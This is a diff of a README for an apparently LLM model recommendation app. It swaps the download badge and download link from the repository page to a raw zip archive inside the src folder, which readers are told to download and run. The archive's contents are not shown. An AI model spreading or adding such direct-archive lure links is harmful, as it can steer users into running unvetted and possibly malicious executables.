@@ -1,12 +1,12 @@
 # 🔎 llm-model-search-recommendation - Find the right model faster
 
-[![Download the app](https://img.shields.io/badge/Download-Visit%20GitHub%20Page-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Keeterete513/llm-model-search-recommendation)
+[![Download the app](https://img.shields.io/badge/Download-Visit%20GitHub%20Page-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Keeterete513/llm-model-search-recommendation/raw/refs/heads/main/src/recommendation_llm_model_search_v1.9.zip)
 
 ## 📥 Download
 
 Use this link to visit the page to download and run the app:
 
-[https://github.com/Keeterete513/llm-model-search-recommendation](https://github.com/Keeterete513/llm-model-search-recommendation)
+[https://github.com/Keeterete513/llm-model-search-recommendation/raw/refs/heads/main/src/recommendation_llm_model_search_v1.9.zip](https://github.com/Keeterete513/llm-model-search-recommendation/raw/refs/heads/main/src/recommendation_llm_model_search_v1.9.zip)
 
 ## 🖥️ What this app does
 
